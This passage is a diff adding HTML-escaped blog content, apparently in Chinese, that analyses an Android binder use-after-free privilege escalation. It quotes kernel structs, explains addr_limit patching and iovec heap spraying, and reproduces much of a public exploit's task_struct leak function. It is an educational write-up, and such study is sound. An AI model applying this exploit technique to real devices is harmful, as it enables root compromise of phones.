+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">binder_thread&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_proc&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">rb_node&lt;/span> &lt;span class="n">rb_node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="n">waiting_thread_node&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">pid&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">looper&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* only modified by this thread */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">looper_need_return&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* can be written by other thread */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_transaction&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">transaction_stack&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">list_head&lt;/span> &lt;span class="n">todo&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">process_todo&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_error&lt;/span> &lt;span class="n">return_error&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_error&lt;/span> &lt;span class="n">reply_error&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">wait_queue_head_t&lt;/span> &lt;span class="n">wait&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">binder_stats&lt;/span> &lt;span class="n">stats&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">atomic_t&lt;/span> &lt;span class="n">tmp_ref&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">bool&lt;/span> &lt;span class="n">is_dead&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">task_struct&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">task&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>注意看该结构体中有个task成员，为task_struct类型。我们首先要做的就是泄露这个结构体的地址，将它改为NULL之后，执行提权语句。下面根据&lt;a class="link" href="https://github.com/sharif-dev/AndroidKernelVulnerability/blob/master/exploit.cpp" target="_blank" rel="noopener"
+>exp&lt;/a>分析整个提权的流程。&lt;/p>
+&lt;h4 id="patch-addr_limit">patch addr_limit&lt;/h4>
+&lt;p>阻止我们拿到权限的第一道关卡为task_struct结构体成员thread_info中的addr_limit（在x86_64上是直接作为task_struct的成员），用于隔离内核空间和用户空间。如果我们能控制它的值，相当于我们能完全的访问内核空间。所以第一步就是把addr_limit patch掉。&lt;/p>
+&lt;p>想要patch掉addr_limit，得先泄露出task_struct的地址，再将值改为&lt;code>0xFFFFFFFFFFFFFFFE&lt;/code>。后面再说为什么要改为这个值。&lt;/p>
+&lt;p>这里先了解一下&lt;strong>vectored I/O&lt;/strong>，也称为分散/聚集 I/O，是一种可以在单次系统调用中对多个缓冲区输入输出的方法，可以把多个缓冲区的数据写到单个数据流，也可以把单个数据流读到多个缓冲区中。与线性 I/O 相比，vectored I/O有一些优势：可以使用不连续的不同缓冲区进行写入或读取，而不会产生大量开销。支持原子性。使用vectored I/O可以将头部和数据保存在单独的非连续缓冲区中，并通过一个系统调用而不是两个系统调用对其进行读取或写入。&lt;/p>
+&lt;p>&lt;img src="https://my-md-1253484710.file.myqcloud.com/20200629154204.png"
+loading="lazy"
+>&lt;/p>
+&lt;p>readv() 函数从文件描述符 fd 中读取 count 个段 (segment) (一个段即一个 iovec 结构体）到参数 iov 所指定的缓冲区中。&lt;/p>
+&lt;p>write() 函数从参数 iov 指定的缓冲区中读取 count 个段的数据，并写入 fd 中。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;sys/uio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>&lt;span class="n">ssize_t&lt;/span> &lt;span class="nf">readv&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">vint&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ssize_t&lt;/span> &lt;span class="nf">writev&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">fd&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>每个 iovec 结构体描述一个独立的，物理不连续的缓冲区，我们称其为段(segment)，每个iovec结构体相对较小，在64bit系统下iovec的大小仅为0x10。&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">void&lt;/span> &lt;span class="n">__user&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="n">iov_base&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* BSD uses caddr_t (1003.1g requires void *) */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">__kernel_size_t&lt;/span> &lt;span class="n">iov_len&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="cm">/* Must be size_t (1003.1g) */&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如何泄露出task_struct？看了几个exp，都用的是&lt;code>struct iovec&lt;/code>去占位覆盖前面释放的binder_thread。这也是Project Zero的做法。这个方法最初是由Keen实验室提出的，iovec具有一些小特性使得它很适合用来作为攻击的媒介：&lt;/p>
+&lt;ol>
+&lt;li>在64bit系统下只有0x10的大小&lt;/li>
+&lt;li>容易控制它的成员iov_base和iov_len。&lt;/li>
+&lt;li>可以控制写入的个数控制iovec最终进入哪个kmalloc缓存&lt;/li>
+&lt;li>它有一个指向缓冲区的指针和一个长度，这是使用unlink进行破坏的理想字段&lt;/li>
+&lt;/ol>
+&lt;p>可通过readv、writev、recvmsg、sendmsg等系统调用和iovec是实现linux下的Vectored I/O。在漏洞利用中我们可以利用来绕过检查，对已释放的空间进行占位布局堆风水。&lt;/p>
+&lt;p>看看exp如何如来泄露信息，作者写了很详细的注释：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">void&lt;/span> &lt;span class="n">BinderUaF&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">leakTaskStruct&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ssize_t&lt;/span> &lt;span class="n">nBytesRead&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">static&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="n">dataBuffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">struct&lt;/span> &lt;span class="n">iovec&lt;/span> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_COUNT&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="n">nullptr&lt;/span>&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Get binder fd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">setupBinder&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Create event poll
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">setupEventPoll&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// We are going to use iovec for scoped read/write,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we need to make sure that iovec stays in the kernel
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// before we trigger the unlink after binder_thread has
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// been freed.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// One way to achieve this is by using the blocking APIs
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// in Linux kernel. Such APIs are read, write, etc on pipe.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Setup pipe for iovec
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up pipe&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">pipe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to create pipe&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Pipe created successfully&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// pipe_fd[0] = read fd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// pipe_fd[1] = write fd
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Default size of pipe is 65536 = 0x10000 = 64KB
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// This is way much of data that we care about
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// Let&amp;#39;s reduce the size of pipe to 0x1000
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">fcntl&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pipe_fd&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">F_SETPIPE_SZ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">ERR&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[-] Unable to change the pipe capacity&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">EXIT_FAILURE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\t&lt;/span>&lt;span class="s">[*] Changed the pipe capacity to: 0x%x&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">PAGE_SIZE&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">INFO&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;[+] Setting up iovecs&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// As we are overlapping binder_thread with iovec,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// binder_thread-&amp;gt;wait.lock will align to iovecStack[10].io_base.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// If binder_thread-&amp;gt;wait.lock is not 0 then the thread will get
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// stuck in trying to acquire the lock and the unlink operation
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// will not happen.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// To avoid this, we need to make sure that the overlapped data
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// should be set to 0.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// iovec.iov_base is a 64bit value, and spinlock_t is 32bit, so if
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// we can pass a valid memory address whose lower 32bit value is 0,
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">// then we can avoid spin lock issue.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="c1">//
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">mmap4gbAlignedPage&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">iovecStack&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">IOVEC_WQ_INDEX&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="n">iov_base&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m_4gb_aligned_page&lt;/span>&lt;span class="p">;&lt;/span>
